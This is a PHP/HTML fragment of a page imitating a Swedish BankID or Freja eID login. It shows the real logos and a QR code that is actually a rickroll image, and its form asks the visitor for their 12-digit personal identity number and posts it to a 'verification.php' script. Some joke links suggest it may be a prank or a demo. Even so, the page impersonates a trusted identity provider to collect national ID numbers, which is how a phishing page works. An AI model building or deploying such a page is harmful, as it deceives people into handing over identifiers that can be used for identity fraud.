<div id="bankid-box" class="inset-container">
    <?php
        if($_POST['login-with'] == 'bankid')
        {
            echo '<img style="max-height:5em;" src="https://www.bankid.com/assets/logo-bank-id-Bw0xWKml.svg" alt="BankID">';
        }
        else if($_POST['login-with'] == 'frejaid')
        {
            echo '<img style="max-height:5em;" src="https://frejaeid.com/wp-content/uploads/2022/11/FrejaIndigo.png" alt="Freja eID">';
        }
    ?>
        <div class="bankid-qr">
            <img class="fade-in" src="https://randomqr.com/assets/images/rickroll-qrcode.webp" alt="BankID">
        </div>
        
        <form method="POST" action="verification.php">
            <p>Skanna QR-koden med BankID-appen på din telefon eller ange ditt personnummer:</p>
            <input type="text" name="pnr" pattern="[0-9]{12}" required="" maxlength="12" placeholder="ÅÅÅÅMMDDXXXX"></input>
            <button class="push-button" type="submit">→</button>
        </form>


        <a href="https://crouton.net/">Legitimera med <?php echo $_POST['login-with'] == 'frejaid' ? 'Freja eID' : 'BankID' ;?> på denna enhet</a>
</div>
